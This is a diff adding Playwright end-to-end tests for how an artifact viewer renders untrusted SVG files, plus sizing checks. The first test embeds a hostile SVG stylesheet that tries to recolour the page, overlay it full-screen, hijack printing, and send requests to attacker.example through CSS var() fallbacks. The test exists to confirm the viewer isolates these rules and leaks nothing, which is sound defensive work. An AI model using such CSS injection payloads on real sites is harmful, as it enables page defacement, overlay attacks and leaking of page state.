@@ -123,6 +123,92 @@ test.describe('Artifact Detail Page — /artifacts/:slug', () => {
     expect(versions.versions).toContain(2)
   })
 
+  test("an SVG artifact's own stylesheet draws its shapes and leaves the page alone, on screen and in print", async ({ page, request }) => {
+    // Rules that reached the whole page when an SVG was drawn straight into it.
+    const content = '<' + 'svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><style>'
+      + '.st0 { fill: rgb(1, 2, 3) } '
+      + 'body, body * { color: rgb(255, 0, 0) !important } '
+      + ':host { display: block !important; position: fixed !important; inset: 0 !important; z-index: 2147483647 !important } '
+      + 'svg { position: fixed !important; inset: 0 !important; width: 100vw !important; height: 100vh !important; z-index: 2147483647 !important } '
+      + '@media print { body * { display: block !important } }'
+      // Reads page state: fetches only while the page leaves --e2e-unset undefined.
+      + 'rect { stroke: var(--e2e-unset, url("https://attacker.example/stylesheet")) } '
+      + '</style><rect class="st0" width="40" height="40" mask="var(--e2e-unset, url(https://attacker.example/attribute))"/></svg>'
+    const { slug, name } = await seedArtifact(request, { kind: 'svg', content })
+    const leaks: string[] = []
+    await page.route('https://attacker.example/**', route => {
+      leaks.push(route.request().url())
+      return route.fulfill({ status: 204 })
+    })
+
+    await page.goto(`/artifacts/${slug}`, { waitUntil: 'domcontentloaded' })
+    const shape = page.getByTestId('viewer-backdrop').locator('rect')
+    await expect(shape).toHaveCSS('fill', 'rgb(1, 2, 3)', { timeout: 10000 })
+    const title = page.getByText(name).first()
+    await expect(title).not.toHaveCSS('color', 'rgb(255, 0, 0)')
+    // Neither the host nor a fixed <svg> lays the drawing over the page.
+    await expect.poll(() => title.evaluate(el => {
+      const box = el.getBoundingClientRect()
+      return el.contains(document.elementFromPoint(box.x + box.width / 2, box.y + box.height / 2))
+    })).toBe(true)
+
+    // Print the title alone, through the print preview's own markers
+    // (components/markdownPanelPrint.ts): the SVG must stay out of the print.
+    await title.evaluate(el => {
+      el.setAttribute('data-print-root', '')
+      document.documentElement.setAttribute('data-printing-preview', '')
+    })
+    await page.emulateMedia({ media: 'print' })
+    await expect(shape).toBeHidden()
+    await expect(title).toBeVisible()
+    await expect(title).not.toHaveCSS('color', 'rgb(255, 0, 0)')
+
+    await page.emulateMedia({ media: 'screen' })
+    await page.goto('/artifacts', { waitUntil: 'domcontentloaded' })
+    await page.getByPlaceholder('Filter by name, slug, description…').fill(slug)
+    await expect(page.locator('rect.st0')).toHaveCSS('fill', 'rgb(1, 2, 3)', { timeout: 10000 })
+    expect(leaks).toEqual([])
+  })
+
+  test('an SVG artifact keeps its size: a view-box-only one fills the viewer and the card, a percent one fits, a wide one scrolls', async ({ page, request }) => {
+    const content = '<' + 'svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600"><rect class="vb" width="800" height="600"/></svg>'
+    const { slug } = await seedArtifact(request, { kind: 'svg', content })
+
+    await page.goto(`/artifacts/${slug}`, { waitUntil: 'domcontentloaded' })
+    const shape = page.getByTestId('viewer-backdrop').locator('rect.vb')
+    await expect.poll(async () => (await shape.boundingBox())?.width ?? 0, { timeout: 10000 }).toBeGreaterThan(100)
+
+    await page.goto('/artifacts', { waitUntil: 'domcontentloaded' })
+    await page.getByPlaceholder('Filter by name, slug, description…').fill(slug)
+    await expect.poll(async () => (await page.locator('rect.vb').boundingBox())?.width ?? 0, { timeout: 10000 }).toBeGreaterThan(100)
+
+    // A drawing sized in percent fits the viewer's height, as it did.
+    const fit = await seedArtifact(request, {
+      kind: 'svg',
+      content: '<' + 'svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 800 100"><rect class="fit" width="800" height="100"/></svg>',
+    })
+    await page.goto(`/artifacts/${fit.slug}`, { waitUntil: 'domcontentloaded' })
+    const fitBackdrop = page.getByTestId('viewer-backdrop')
+    await expect(fitBackdrop.locator('rect.fit')).toHaveCount(1, { timeout: 10000 })
+    await expect.poll(() => fitBackdrop.evaluate(el => {
+      const svg = el.querySelector('[data-guide-untrusted]')?.shadowRoot?.querySelector('svg')
+      return !!svg && Math.abs(svg.getBoundingClientRect().height - el.clientHeight) <= el.clientHeight * 0.2
+    })).toBe(true)
+
+    // A drawing that does not shrink overflows the viewer; its far side stays in reach by scrolling.
+    const wide = await seedArtifact(request, {
+      kind: 'svg',
+      content: '<' + 'svg xmlns="http://www.w3.org/2000/svg" width="4000" height="200" style="flex-shrink: 0"><rect class="wide" width="4000" height="200"/></svg>',
+    })
+    await page.goto(`/artifacts/${wide.slug}`, { waitUntil: 'domcontentloaded' })
+    const backdrop = page.getByTestId('viewer-backdrop')
+    await expect(backdrop.locator('rect.wide')).toHaveCount(1, { timeout: 10000 })
+    await expect.poll(() => backdrop.evaluate(el => {
+      const host = el.querySelector('[data-guide-untrusted]')
+      return [el, host].some(box => !!box && box.scrollWidth - box.clientWidth > 1000)
+    })).toBe(true)
+  })
+
   test('404 page for non-existent slug', async ({ page }) => {
     await page.goto('/artifacts/non-existent-slug-xyz', { waitUntil: 'domcontentloaded' })
     // The detail page shows an error message containing the slug
